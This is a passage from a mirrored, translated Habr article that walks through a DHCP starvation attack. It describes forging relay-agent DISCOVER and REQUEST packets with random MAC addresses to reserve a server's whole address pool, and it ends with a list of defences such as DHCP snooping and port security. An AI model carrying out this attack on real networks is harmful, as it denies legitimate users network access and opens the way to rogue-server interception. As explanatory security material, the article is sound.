href="https://github.com/hatRiot/zarp/blob/master/src/modules/dos/dhcp_starvation.py">opinion</a> that it is possible to conduct this attack by sending only a large number of <strong>DHCPDISCOVER</strong> or <strong>DHCPREQUEST</strong> requests from random MAC addresses, and then the DHCP server will allocate and reserve an IP address for each such request, but this is not always the case.  As we already know, the procedure for obtaining and reserving an IP address ends when the DHCP server sends a <strong>DHCPACK</strong> message.  It is most correct to carry out this attack, posing as a <strong>DHCP relay agent</strong> . </p><br><p>  Let's give an example: </p><br><ol><li><p>  Our network interface is <strong>enp0s3</strong> with a MAC address: <strong>08: 00: 27: 6a: 82: 5f</strong> and an IP address: <strong>192.168.1.2</strong> .  <strong>Dnsmasq / 2.73</strong> from <strong>OpenWrt Chaos Calmer 15.05.1</strong> will act as the DHCP server <strong>. 15.05.1</strong> IP-address: <strong>192.168.1.1</strong> <br><br><img src="https://habrastorage.org/web/4a8/e90/d43/4a8e90d430434db0b20d95dd5304d224.png" alt="Before send"><br><br><br><img src="https://habrastorage.org/web/4a6/1c3/772/4a61c37726fe4dd3b8e00a877fb92b9e.png" alt="DHCP relay script help"></p><br></li><li>  We start sending requests: <br><br><img src="https://habrastorage.org/web/3ad/57e/f9a/3ad57ef9a75545d39d5b5a0ed5869d76.png" alt="Send DHCP requests 1"><br><br><img src="https://habrastorage.org/web/d0a/d1c/ed5/d0ad1ced598b4b32b6862f556d81441e.png" alt="Send DHCP requests 2"></li></ol><br><p>  Thus, we will forget the entire pool of free IP addresses, and a legitimate DHCP client will be able to get an IP address from this DHCP server only after <strong>12 hours</strong> .  While a legitimate DHCP server cannot send responses to clients, we can do this! </p><br><p>  How it works: </p><br><ol><li><p>  We form and send a broadcast DHCPDISCOVER-request, at the same time we present ourselves as the DHCP relay agent.  In the <strong>giaddr</strong> (Relay agent IP) field, <strong>we</strong> indicate our IP address <strong>192.168.1.2</strong> , in the <strong>chaddr</strong> (Client MAC address) field - random MAC <strong>00: 19: bb: f5: e7: a8</strong> , while at the data link layer in SRC MAC we set our MAC address. <br><br><img src="https://habrastorage.org/web/0f1/7cf/1db/0f17cf1dbfb44b1e9e841a253711ec63.png" alt="DHCPDISCOVER"></p><br></li><li><p>  The server responds with a DHCPOFFER message to the relay agent (us), and offers the client with the MAC address <strong>00: 19: bb: f5: e7: a8</strong> IP address <strong>192.168.1.232</strong> <br><br><img src="https://habrastorage.org/web/991/a1d/01f/991a1d01f08b4e2d8eb9201bdcc0ea01.png" alt="DHCPOFFER"></p><br></li><li><p>  After receiving the DHCPOFFER, we send a broadcast DHCPREQUEST request, while in the DHCP option with code 50 ( <a href="https://tools.ietf.org/html/rfc2132">Requested IP address</a> ), we set the IP address <strong>192.168.1.232</strong> offered to the client, in the option with code 12 ( <a href="https://tools.ietf.org/html/rfc2132">Host Name Option</a> ) we set a random line.  <strong>Important: the</strong> <strong>xid</strong> (Transaction ID) and <strong>chaddr</strong> (Client MAC address) fields in DHCPREQUEST and DHCPDISCOVER must be the same, otherwise the server will reject the request, because it will look like another transaction from the same client, or another client with the same transaction. <br><br><img src="https://habrastorage.org/web/f64/9f9/f6a/f649f9f6a7e44936997b618f09bd5225.png" alt="DHCPREQUEST"></p><br></li><li>  The server sends a DHCPACK message to the relay agent.  From this point on, the IP address <strong>192.168.1.232</strong> is considered reserved for the client with the MAC address <strong>00: 19: bb: f5: e7: a8</strong> for 12 hours (the default lease time). <br><br><img src="https://habrastorage.org/web/07d/cb9/341/07dcb93413d24665a7e3ca884a3ef6e7.png" alt="DHCPACK"></li></ol><br><h2 id="vyvody">  findings </h2><br><p>  Ways to counter: </p><br><ol><li><p>  <a href="http://xgu.ru/wiki/DHCP_snooping">DHCP snooping</a> is a switch function designed to protect against attacks using DHCP.  For example, attacks with the substitution of a DHCP server on the network; </p><br></li><li><p>  <a href="http://xgu.ru/wiki/Port_security">Port security</a> is a switch function that allows you to specify the MAC addresses of hosts that are allowed to transmit data through the port.  After that, the port does not transmit packets if the sender's MAC address is not specified as allowed; </p><br></li><li><p>  Setting up network equipment to limit the number of DHCPDISCOVER and DHCPREQUEST requests from a single MAC address and / or IP address; </p><br></li><li><p>  Record and analyze network traffic to track anomalies.  For example, the usual number of DHCP requests on your network does not exceed 100‚Äì200 per day, and during a DHCP starvation attack, their number increases many times.  Another example: in your network, usually the number of DHCP responses does not exceed the number of DHCP requests, and now the number of DHCP responses has doubled the number of DHCP requests.  This means that someone makes an attack with the substitution of a DHCP server; </p><br></li><li><p>  Using <a href="https://ru.wikipedia.org/wiki/%25D0%25A1%25D0%25B8%25D1%2581%25D1%2582%25D0%25B5%25D0%25BC%25D0%25B0_%25D0%25BE%25D0%25B1%25D0%25BD%25D0%25B0%25D1%2580%25D1%2583%25D0%25B6%25D0%25B5%25D0%25BD%25D0%25B8%25D1%258F_%25D0%25B2%25D1%2582%25D0%25BE%25D1%2580%25D0%25B6%25D0%25B5%25D0%25BD%25D0%25B8%25D0%25B9">IDS</a> , <a href="https://ru.wikipedia.org/wiki/%25D0%25A1%25D0%25B8%25D1%2581%25D1%2582%25D0%25B5%25D0%25BC%25D0%25B0_%25D0%25BF%25D1%2580%25D0%25B5%25D0%25B4%25D0%25BE%25D1%2582%25D0%25B2%25D1%2580%25D0%25B0%25D1%2589%25D0%25B5%25D0%25BD%25D0%25B8%25D1%258F_%25D0%25B2%25D1%2582%25D0%25BE%25D1%2580%25D0%25B6%25D0%25B5%25D0%25BD%25D0%25B8%25D0%25B9">IPS</a> , <a href="https://ru.wikipedia.org/wiki/SIEM">SIEM</a> and <a href="https://ru.wikipedia.org/wiki/Zabbix">Zabbix</a> type equipment monitoring systems; </p><br></li><li><p>  If possible, use static MAC - IP binding on a DHCP server; </p><br></li><li><p>  Use DHCP relays and DHCP servers supporting DHCP option code <a href="http://xgu.ru/wiki/%25D0%259E%25D0%25BF%25D1%2586%25D0%25B8%25D1%258F_82_DHCP">82</a> ; </p><br></li><li>  Continuous software updates.  You can update the hosts and <a href="https://news.ycombinator.com/item%3Fid%3D8372040">so</a> :) </li></ol></div><p>Source: <a href="https://habr.com/ru/post/333978/">https://habr.com/ru/post/333978/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../333962/index.html">‚ÄúKnow yourself‚Äù: social media mining-projects at ITMO University</a></li>
<li><a href="../333966/index.html">When in Russia to wait for 5G</a></li>
<li><a href="../333970/index.html">Choosing the right HPE Aruba switch for your small or medium business network</a></li>
<li><a href="../333972/index.html">How and why to hide phone numbers</a></li>
<li><a href="../333976/index.html">Come down from heaven: let's just count?</a></li>
<li><a href="../333980/index.html">Take care of your points or how to resist fraud in loyalty programs</a></li>
<li><a href="../333982/index.html">Hummingbirds for Phantom</a></li>
<li><a href="../333984/index.html">Found new version of the program. Install?</a></li>
<li><a href="../333986/index.html">Why we chose TypeScript: the history of developers from Reddit</a></li>
<li><a href="../333988/index.html">A team of web enthusiasts introduced the P2P browser Beaker</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>